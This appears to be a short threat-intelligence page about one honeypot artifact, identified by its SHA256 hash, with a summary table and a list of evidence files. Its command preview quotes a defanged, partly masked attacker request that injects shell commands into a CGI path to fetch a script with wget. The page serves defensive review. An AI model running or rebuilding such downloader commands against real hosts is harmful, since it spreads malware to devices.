# d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `d8d0ad1cb47d145c1ddad3bb121b87cdd047e23cf1cac0735b1c7826cf293b0c` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgi-bin/;cd /tmp;rm -f .s;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O .s;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O .s;cur
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
